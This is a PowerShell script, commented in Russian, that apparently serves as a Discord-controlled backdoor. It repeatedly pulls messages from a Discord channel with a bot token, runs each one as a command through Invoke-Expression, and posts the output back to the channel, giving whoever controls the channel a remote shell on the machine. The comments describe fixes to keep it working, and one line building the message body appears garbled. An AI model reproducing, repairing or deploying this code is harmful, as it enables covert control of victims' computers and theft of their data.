$token = "$tk"
$chan  = "$ch"

$response = ""
$previouscmd = ""
$authenticated = 0

function PullMsg {
    $headers = @{'Authorization' = "Bot $token"}
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", $headers.Authorization)
    try {
        $result = $webClient.DownloadString("https://discord.com/api/v9/channels/$chan/messages")
        if ($result) {
            $msg = ($result | ConvertFrom-Json)[0]
            if (-not $msg.author.bot) { $script:response = $msg.content.Trim() }
        }
    } catch {}
}

# ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
# ВОТ ЭТОТ sendMsg — РАБОЧИЙ В 2025 ГОДУ (остальное не трогаем)
function sendMsg {
    param([string]$Message)
    if (!$Message) { return }

    # ФИКС 1: обязательно экранируем обратные кавычки
    $Message = $Message -replace '`', 'ˋ'

    # ФИКС 2: правильный multipart вместо старого JSON
    $boundary = [guid]::NewGuid().ToString()
    $LF = "`r`n"
    $body = "--$boundary$LFContent-Disposition: form-data; name=`"payload_json`"$LF$$ LF $$(@{content=$Message}|ConvertTo-Json -Compress)$LF--$boundary--"

    try {
        Invoke-RestMethod -Uri "https://discord.com/api/v9/channels/$chan/messages" `
            -Method Post `
            -Headers @{ "Authorization" = "Bot $token" } `
            -ContentType "multipart/form-data; boundary=$boundary" `
            -Body ([text.encoding]::UTF8.GetBytes($body)) `
            -TimeoutSec 10 | Out-Null
    } catch {
        # на всякий случай — чтобы не падало совсем
        try { Invoke-RestMethod -Uri "https://discord.com/api/v9/channels/$chan/messages" -Method Post -Headers @{Authorization="Bot $token"} -Body ([text.encoding]::UTF8.GetBytes("{\"content\":\"[ошибка отправки]\"}")) -ContentType "application/json" | Out-Null } catch {}
    }
}

Function Authenticate{
    if ($response -like "$env:COMPUTERNAME"){
        $script:authenticated = 1
        $script:previouscmd = $response
        sendMsg ":white_check_mark: **$env:COMPUTERNAME** | ``Session Started!`` :white_check_mark:"
        sendMsg "``PS | $($PWD.Path)>``"
    }
}

PullMsg
$previouscmd = $response
sendMsg ":hourglass: **$env:COMPUTERNAME** | ``Session Waiting..`` :hourglass:"

while ($true) {
    PullMsg
    if ($response -ne $previouscmd) {
        $previouscmd = $response
        $dir = $PWD.Path

        if ($authenticated -eq 1) {
            if ($response -eq "close") {
                sendMsg ":octagonal_sign: Session Closed."
                break
            }
            if ($response -eq "Pause") {
                $authenticated = 0
                sendMsg ":pause_button: Paused."
                continue
            }

            # ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
            # ИСПРАВЛЕНО: теперь отправляем $chunk, а не пустые ```
            $Result = try { iex $response 2>&1 | Out-String } catch { "$_" }
            if ($Result.Trim() -eq "") {
                sendMsg ":white_check_mark: ``Command Sent`` :white_check_mark:"
            } else {
                $output = $Result.TrimEnd()
                for ($i=0; $i -lt $output.Length; $i += 1900) {
                    $chunk = $output.Substring($i, [Math]::Min(1900, $output.Length-$i))
                    sendMsg "``````$chunk``````"     # ←←←← ВОТ ЭТО БЫЛО СЛОМАНО РАНЬШЕ
                    Start-Sleep -Milliseconds 400
                }
            }
            sendMsg "``PS | $dir>``"
        } else {
            Authenticate
        }
    }
    Start-Sleep -Seconds 5
}
